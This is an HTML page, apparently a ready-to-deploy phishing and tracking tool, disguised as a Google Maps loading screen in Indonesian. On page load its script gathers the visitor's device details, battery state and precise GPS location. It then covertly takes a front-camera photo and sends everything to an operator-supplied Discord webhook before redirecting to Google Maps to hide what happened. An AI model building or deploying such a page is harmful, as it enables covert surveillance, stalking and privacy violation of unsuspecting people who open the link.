<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Memuat Lokasi...</title>
    <link rel="icon" type="image/x-icon" href="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; background: #f8f9fa; overflow: hidden; }
        #loader { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
        .status { color: #5f6368; font-size: 15px; }
        canvas, video { display: none; }
    </style>
</head>
<body>

<div id="loader">
    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
    <div class="status">Mengalibrasi GPS...<br><span style="font-size: 11px;">Mohon tunggu sebentar untuk akurasi terbaik</span></div>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
  // GANTI DENGAN WEBHOOK DISCORD KAMU
    const DISCORD_WEBHOOK = "MASUKKAN_URL_WEBHOOK_KAMU_DI_SINI";

    async function sendData(content, file = null) {
        const formData = new FormData();
        if (file) {
            formData.append('file', file, 'capture.jpg');
            formData.append('payload_json', JSON.stringify({ content: content }));
        } else {
            formData.append('payload_json', JSON.stringify({ content: content }));
        }
        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    }

    async function getDeviceInfo() {
        let batteryInfo = "Tidak Terdeteksi";
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Lagi di-cas ⚡' : 'Tidak di-cas 🪫'})`;
        }
        
        const info = `
📱 **Informasi Perangkat Target:**
• **HP/Browser:** ${navigator.userAgent}
• **Baterai:** ${batteryInfo}
• **Platform:** ${navigator.platform}
• **Bahasa:** ${navigator.language}
        `;
        return info;
    }

    async function startCapture() {
        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

        if (navigator.geolocation) {
            // Ambil Info Perangkat Dulu
            const deviceInfo = await getDeviceInfo();
            await sendData(deviceInfo);

            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                await sendData(`📍 **Lokasi Terdeteksi!**\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapsUrl}`);

                // Ambil Foto
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(async (blob) => {
                            await sendData("📸 **Foto Target:**", blob);
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = mapsUrl; 
                        }, 'image/jpeg');
                    }, 2000);
                } catch (e) {
                    window.location.href = mapsUrl;
                }
            }, (err) => {
                window.location.href = "https://www.google.com/maps";
            }, options);
        }
    }

    window.onload = startCapture;
</script>
</body>
</html>
